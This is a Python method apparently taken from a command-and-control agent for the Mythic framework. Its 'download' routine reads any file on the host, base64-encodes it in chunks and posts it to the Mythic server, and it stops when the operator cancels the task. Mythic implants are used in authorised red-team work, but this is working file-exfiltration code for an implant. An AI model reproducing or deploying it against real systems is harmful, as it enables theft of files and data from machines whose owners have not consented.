    def download(self, task_id, file=""):
        try:
            file_path = file if os.path.isabs(file) else os.path.join(self.current_directory, file)
            if not os.path.exists(file_path):
                return "File not found: {}".format(file_path)

            file_size    = os.path.getsize(file_path)
            total_chunks = (file_size + CHUNK_SIZE - 1) // CHUNK_SIZE

            init_resp = self.postMessageAndRetrieveResponse({
                "action": "post_response",
                "responses": [{
                    "task_id": task_id,
                    "download": {
                        "total_chunks": total_chunks,
                        "full_path":    file_path,
                        "chunk_size":   CHUNK_SIZE
                    }
                }]
            })

            responses_list = init_resp.get("responses", [])
            file_id = responses_list[0].get("file_id") if responses_list else None

            if not file_id:
                return "Download error: Mythic nao retornou file_id"

            with open(file_path, 'rb') as f:
                for chunk_num in range(1, total_chunks + 1):
                    with self._taskings_lock:
                        stopped = next(
                            (t["stopped"] for t in self.taskings if t["task_id"] == task_id),
                            False
                        )
                    if stopped:
                        return "Job stopped."
                    content = f.read(CHUNK_SIZE)
                    if not content:
                        break
                    self.postMessageAndRetrieveResponse({
                        "action": "post_response",
                        "responses": [{
                            "task_id": task_id,
                            "download": {
                                "chunk_num":  chunk_num,
                                "file_id":    file_id,
                                "chunk_data": base64.b64encode(content).decode()
                            }
                        }]
                    })

            return json.dumps({"agent_file_id": file_id})

        except Exception as e:
            return "Download error: {}".format(e)
